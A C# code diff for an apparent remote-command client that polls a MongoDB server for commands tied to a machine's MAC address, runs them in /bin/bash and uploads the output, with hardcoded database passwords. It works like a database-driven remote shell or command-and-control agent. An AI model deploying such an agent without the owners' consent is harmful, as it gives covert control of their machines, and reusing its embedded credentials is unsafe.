@@ -3,11 +3,9 @@ using System.Text;
 using System.IO;
 using System.Diagnostics;
 using System.Threading;
-using System.Net;
-using System.Net.Sockets;
-using System.Runtime.InteropServices;
 using MongoDB.Driver;
 using MongoDB.Bson;
+using System.Linq;
 
 namespace ProcessAsyncStreamSamples
 {
@@ -22,7 +20,7 @@ namespace ProcessAsyncStreamSamples
             while (true)
             {
                 string inputText = client.infosender.Clientinfosender(mac, databaseip, databaseport);
-                if (inputText != null)
+                if (!String.IsNullOrEmpty(inputText))
                 {
                     Process Terminalprocess = new Process();
                     Terminalprocess.StartInfo.FileName = "/bin/bash";
@@ -41,6 +39,7 @@ namespace ProcessAsyncStreamSamples
                     BsonDocument doc = new BsonDocument();
                     while(true)
                     {
+                        Console.WriteLine(inputText);
                         doc.Add(new BsonElement("name", "client"));
                         doc.Add(new BsonElement("command", inputText));
                         sendOutput.Clear();
@@ -49,43 +48,98 @@ namespace ProcessAsyncStreamSamples
                         {
                             StreamWriter.WriteLine(inputText);
 
+
                         }
                         catch
                         {
-                            var dbClient = new MongoClient("mongodb://client:client99@" + databaseip + ":" + databaseport + "/admin");
+                            var dbClient1 = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
                             ////create collection
-                            IMongoDatabase respondsdatabase = dbClient.GetDatabase("responds");
+                            IMongoDatabase respondsdatabase1 = dbClient1.GetDatabase("responds");
                             ////creat Mac object
-                            var respondscollection = respondsdatabase.GetCollection<BsonDocument>(mac);
+                            var respondscollection1 = respondsdatabase1.GetCollection<BsonDocument>(mac);
                             doc.Add(new BsonElement("respond", "i cant run ur command!"));
-                            respondsdatabase.DropCollection(mac);
-                            respondscollection.InsertOne(doc);
+                            respondsdatabase1.DropCollection(mac);
+                            respondscollection1.InsertOne(doc);
                             doc.Clear();
                             StreamWriter.Close();
                             Terminalprocess.Kill();
                             Terminalprocess.Close();
                             break;
                         }
-                        Thread.Sleep(1500);
+                        Thread.Sleep(10000);
                         if (!String.IsNullOrEmpty(sendOutput.ToString()))
                         {
-                            doc.Add(new BsonElement("respond", sendOutput.ToString()));
+                            using (StringReader reader = new StringReader(sendOutput.ToString()))
+                            {
+                                string line = string.Empty;
+                                int i = 0;
+                                do
+                                {
+                                    line = reader.ReadLine();
+                                    if (line != null)
+                                    {
+                                        doc.Add(new BsonElement("outputline: "+ i.ToString(), line));
+                                        i++;
+                                    }
+
+                                } while (line != null);
+                            }
 
                         }
                         if (!String.IsNullOrEmpty(senderrOutput1.ToString()))
                         {
-                            Thread.Sleep(1500);
-                            doc.Add(new BsonElement("respond", senderrOutput1.ToString()));
+                            using (StringReader reader = new StringReader(senderrOutput1.ToString()))
+                            {
+                                string line = string.Empty;
+                                int i = 0;
+                                do
+                                {
+                                    line = reader.ReadLine();
+                                    if (line != null)
+                                    {
+                                        doc.Add(new BsonElement("erroroutputline: "+i.ToString(), line));
+                                        i++;
+                                    }
+
+                                } while (line != null);
+                            }
                         }
                         if (String.IsNullOrEmpty(sendOutput.ToString()) && String.IsNullOrEmpty(senderrOutput1.ToString()))
                         {
                             doc.Add(new BsonElement("respond", "ur command havent any output"));
                         }
-                        var dbClient1 = new MongoClient("mongodb://client:client99@" + databaseip + ":" + databaseport + "/admin");
-                        IMongoDatabase respondsdatabase1 = dbClient1.GetDatabase("responds");
-                        var respondscollection1 = respondsdatabase1.GetCollection<BsonDocument>(mac);
-                        respondsdatabase1.DropCollection(mac);
-                        respondscollection1.InsertOne(doc);
+                        var dbClient = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
+                        IMongoDatabase respondsdatabase = dbClient.GetDatabase("responds");
+                        var respondscollection = respondsdatabase.GetCollection<BsonDocument>(mac);
+                        respondsdatabase.DropCollection(mac);
+                        respondscollection.InsertOne(doc);
+                        IMongoDatabase commandsdatabase = dbClient.GetDatabase("commands");
+                        ////creat Mac object
+                        var commadscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
+                        var filter = Builders<BsonDocument>.Filter.Eq("name", "server");
+                        var servercommand = commadscollection.Find(filter).FirstOrDefault();
+                        try
+                        {
+                            inputText = servercommand.ElementAt(2).Value.ToString();
+                            var update = Builders<BsonDocument>.Update.Set("command", "");
+                            commadscollection.UpdateOne(filter, update);
+                            if(inputText == "")
+                            {
+                                StreamWriter.Close();
+                                Terminalprocess.Kill();
+                                Terminalprocess.Close();
+                                inputText = null;
+                                break;
+                            }
+                        }
+                        catch
+                        {
+                            StreamWriter.Close();
+                            Terminalprocess.Kill();
+                            Terminalprocess.Close(); 
+                            inputText = null;
+                            break;
+                        }
                     }
 
                 }
